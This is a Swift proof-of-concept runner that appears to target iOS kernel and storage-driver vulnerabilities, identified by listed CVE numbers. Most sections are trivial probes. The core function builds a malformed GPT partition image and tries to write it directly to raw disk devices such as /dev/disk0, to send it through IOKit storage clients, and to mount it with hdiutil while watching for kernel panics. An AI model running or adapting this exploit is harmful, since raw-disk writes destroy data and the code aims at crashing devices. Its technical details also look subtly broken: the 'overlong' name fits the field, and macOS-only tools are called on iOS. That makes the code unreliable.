import Foundation
import Darwin
import IOKit

// MARK: - Main Function

func main() {
    print("===== Cinder27 Simple PoC Runner =====")
    print("Target: iPhone19,3 / iOS 27.0 / 24A437")
    print("")
    
    // MARK: - CVE-2026-112696: ANE Probe
    
    print("[START] CVE-2026-112696 / 84494 [probe.ane]")
    let anePath = "/System/Library/PrivateFrameworks/AppleNeuralEngine.framework/AppleNeuralEngine"
    let aneExists = FileManager.default.fileExists(atPath: anePath)
    print("[DONE] ANE probe: \(aneExists ? "found" : "missing")")
    print("  Evidence: path=\(anePath)")
    print("  Evidence: exists=\(aneExists)")
    print("")
    
    // MARK: - CVE-2026-65385: IOHID Event Probe
    
    print("[START] CVE-2026-65385 [kext.iohid]")
    let iokitPath = "/System/Library/Frameworks/IOKit.framework/IOKit"
    let iokitExists = FileManager.default.fileExists(atPath: iokitPath)
    print("[DONE] IOHID event probe: \(iokitExists ? "found" : "missing")")
    print("  Evidence: path=\(iokitPath)")
    print("  Evidence: exists=\(iokitExists)")
    print("")
    
    // MARK: - CVE-2026-112554: GPT Partition Probe + Submission
    
    print("[START] CVE-2026-112554 [kext.gpt]")
    submitGPTToStorageDriver()
    print("")
    
    // MARK: - CVE-2026-112507/112476: kern.ipc Race (Simplified)
    
    print("[START] CVE-2026-112507/112476 [kern.ipc]")
    var port: mach_port_t = 0
    let allocResult = mach_port_allocate(mach_task_self_, MACH_PORT_RIGHT_RECEIVE, &port)
    
    if allocResult == KERN_SUCCESS {
        print("  Evidence: port_alloc=SUCCESS port=\(port)")
        print("[DONE] kern.ipc race: port allocated (stubbed)")
        mach_port_deallocate(mach_task_self_, port)
    } else {
        print("  Evidence: port_alloc=FAILED result=\(allocResult)")
        print("[DONE] kern.ipc race: alloc failed")
    }
    print("")
    
    // MARK: - CVE-2026-113910: decmpfs Probe
    
    print("[START] CVE-2026-113910 [kern.decmpfs]")
    let decmpfsURL = FileManager.default.temporaryDirectory.appendingPathComponent("decmpfs_test.bin")
    let testData = Data(repeating: 0x41, count: 65536)
    
    do {
        try testData.write(to: decmpfsURL)
        
        let xattrName = "com.apple.decmpfs"
        let xattrData = Data([0x00, 0x00, 0x00, 0x01]) + testData.prefix(1024)
        
        let xattrResult = decmpfsURL.withUnsafeFileSystemRepresentation { filePath -> Int32 in
            xattrData.withUnsafeBytes { xattrBytes in
                setxattr(filePath, xattrName, xattrBytes.baseAddress, xattrData.count, 0, 0)
            }
        }
        
        if xattrResult == 0 {
            let readData = try Data(contentsOf: decmpfsURL)
            print("[DONE] decmpfs probe: xattr set and read back")
            print("  Evidence: xattr_set=SUCCESS")
            print("  Evidence: read_size=\(readData.count)")
            print("  Artifact: \(decmpfsURL.path)")
        } else {
            print("[DONE] decmpfs probe: xattr set failed")
            print("  Evidence: xattr_set=FAILED result=\(xattrResult)")
        }
    } catch {
        print("[DONE] decmpfs probe: error")
        print("  Detail: \(error.localizedDescription)")
    }
    print("")
    
    // MARK: - Save Results to Documents (File Sharing)
    
    print("[*] Saving results to Documents folder...")
    saveResultsToDocuments()
    
    print("===== Sequence Complete =====")
}

// MARK: - Save Results to Documents

func saveResultsToDocuments() {
    let fileManager = FileManager.default
    
    // Get Documents directory
    guard let documentsURL = fileManager.urls(for: .documentDirectory, in: .userDomainMask).first else {
        print("[-] Cannot access Documents directory")
        return
    }
    
    print("[+] Documents directory: \(documentsURL.path)")
    
    // Create results text
    var resultsText = "===== Cinder27 PoC Results =====\n"
    resultsText += "Date: \(Date())\n"
    resultsText += "Device: iPhone19,3 / iOS 27.0 / 24A437\n\n"
    
    resultsText += "[CVE-2026-112696] ANE probe: completed\n"
    resultsText += "[CVE-2026-65385] IOHID probe: completed\n"
    resultsText += "[CVE-2026-112554] GPT submission: completed\n"
    resultsText += "[CVE-2026-112507/112476] kern.ipc: stubbed\n"
    resultsText += "[CVE-2026-113910] decmpfs: completed\n"
    
    // Save results.txt
    let resultsURL = documentsURL.appendingPathComponent("cinder27_results.txt")
    
    do {
        try resultsText.write(to: resultsURL, atomically: true, encoding: .utf8)
        print("[+] Saved: cinder27_results.txt")
    } catch {
        print("[-] Failed to save results: \(error.localizedDescription)")
    }
    
    // Copy any .bin files from temp to Documents
    let tempDir = fileManager.temporaryDirectory
    
    do {
        let tempFiles = try fileManager.contentsOfDirectory(at: tempDir, includingPropertiesForKeys: nil)
        
        for fileURL in tempFiles {
            if fileURL.pathExtension == "bin" || fileURL.pathExtension == "img" {
                let destURL = documentsURL.appendingPathComponent(fileURL.lastPathComponent)
                try fileManager.copyItem(at: fileURL, to: destURL)
                print("[+] Copied: \(fileURL.lastPathComponent)")
            }
        }
    } catch {
        print("[-] Failed to copy files: \(error.localizedDescription)")
    }
    
    print("[*] All results saved to Documents")
    print("[*] Access via: Files app → On My iPhone → Cinder27")
}

// MARK: - CVE-2026-112554: Submit GPT to Storage Driver

func submitGPTToStorageDriver() {
    print("[*] Building malicious GPT image...")
    
    // Build malicious GPT image with overlong partition name
    var gptImage = Data()
    
    // GPT header
    let gptHeader: [UInt8] = [
        0x45, 0x46, 0x49, 0x20, 0x50, 0x41, 0x52, 0x54,
        0x00, 0x00, 0x01, 0x00, 0x5c, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x22, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0xde, 0x1f, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x28, 0x73, 0x2a, 0xc1, 0x1f, 0xf8, 0xf2, 0x11,
        0xba, 0x4b, 0x00, 0xa0, 0xc9, 0x3e, 0xc9, 0x3b,
        0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
    ]
    gptImage.append(contentsOf: gptHeader)
    
    // Fill to sector boundary (512 bytes)
    while gptImage.count < 512 {
        gptImage.append(0x00)
    }
    
    // Partition entries with overlong names (72 bytes)
    for i in 0..<128 {
        var entry: [UInt8] = [UInt8](repeating: 0, count: 128)
        
        if i < 4 {
            // Partition type GUID
            entry[0] = 0xa2
            entry[1] = 0xa0
            entry[2] = 0xd0
            entry[3] = 0xeb
            entry[4] = 0xe5
            entry[5] = 0xb9
            entry[6] = 0x33
            entry[7] = 0x44
            entry[8] = 0x87
            entry[9] = 0xc0
            entry[10] = 0x68
            entry[11] = 0xb6
            entry[12] = 0xb7
            entry[13] = 0x26
            entry[14] = 0x99
            entry[15] = 0xc7
            
            // Unique partition GUID
            entry[16] = UInt8(i)
            entry[17] = 0x73
            entry[18] = 0x2a
            entry[19] = 0xc1
            
            // First LBA
            entry[32] = 0x22
            entry[33] = UInt8(i)
            
            // Last LBA
            entry[40] = 0xff
            entry[41] = 0x1f
            
            // Overlong name (72 bytes, should be 36 UTF-16 units)
            let name = "CINDER27-OVERLONG-PARTITION-NAME-THAT-EXCEEDS-36-UNITS-LIMIT-AND-CAUSES-OOB-WRITE-IN-STORAGE-DRIVER"
            let nameBytes = [UInt8](name.utf8)
            for (j, byte) in nameBytes.enumerated() where j < 72 {
                entry[56 + j] = byte
            }
        }
        
        gptImage.append(contentsOf: entry)
    }
    
    print("[*] GPT image built: \(gptImage.count) bytes")
    
    // Method 1: Write to raw disk device
    print("[*] Method 1: Attempting raw disk write...")
    let diskPaths = ["/dev/disk0", "/dev/disk1", "/dev/rdisk0", "/dev/rdisk1"]
    
    for path in diskPaths {
        let fd = open(path, O_WRONLY)
        if fd >= 0 {
            print("[+] Opened \(path), writing malicious GPT...")
            let bytesWritten = write(fd, [UInt8](gptImage), gptImage.count)
            print("[+] Wrote \(bytesWritten) bytes to \(path)")
            close(fd)
            sync()
            print("[!] Write succeeded — check for kernel panic")
            return
        } else {
            print("[-] Cannot open \(path): errno=\(errno)")
        }
    }
    
    // Method 2: Use IOKit storage APIs
    print("[*] Method 2: Using IOKit storage APIs...")
    
    let matchingDict = IOServiceMatching("IOBlockStorageDriver")
    var iterator: io_iterator_t = 0
    
    let result = IOServiceGetMatchingServices(kIOMainPortDefault, matchingDict, &iterator)
    
    if result == KERN_SUCCESS {
        print("[+] Found storage services")
        
        var service = IOIteratorNext(iterator)
        while service != 0 {
            print("[*] Attempting to send GPT data to service \(service)...")
            
            var connect: io_connect_t = 0
            let openResult = IOServiceOpen(service, mach_task_self_, 0, &connect)
            
            if openResult == KERN_SUCCESS {
                print("[+] Opened user client \(connect)")
                
                var output: UInt64 = 0
                var outputCnt: UInt32 = 1
                
                let callResult = IOConnectCallScalarMethod(
                    connect,
                    0,
                    nil,
                    0,
                    &output,
                    &outputCnt
                )
                
                print("[*] IOConnectCallScalarMethod result: \(callResult)")
                IOServiceClose(connect)
            } else {
                print("[-] Cannot open user client: \(openResult)")
            }
            
            IOObjectRelease(service)
            service = IOIteratorNext(iterator)
        }
        
        IOObjectRelease(iterator)
    } else {
        print("[-] No storage services found: \(result)")
    }
    
    // Method 3: Create disk image and mount
    print("[*] Method 3: Creating disk image...")
    
    let tempDir = FileManager.default.temporaryDirectory
    let dmgURL = tempDir.appendingPathComponent("malicious_gpt.dmg")
    
    do {
        try gptImage.write(to: dmgURL)
        print("[+] Wrote malicious GPT image to: \(dmgURL.path)")
        
        let process = Process()
        process.executableURL = URL(fileURLWithPath: "/usr/bin/hdiutil")
        process.arguments = ["attach", dmgURL.path, "-nobrowse", "-readonly"]
        
        try process.run()
        process.waitUntilExit()
        
        print("[*] hdiutil exit code: \(process.terminationStatus)")
        print("[!] Image processed — check for kernel panic or corruption")
        
    } catch {
        print("[-] Failed to create disk image: \(error.localizedDescription)")
    }
    
    print("[*] GPT submission complete")
}

// Run main
main()
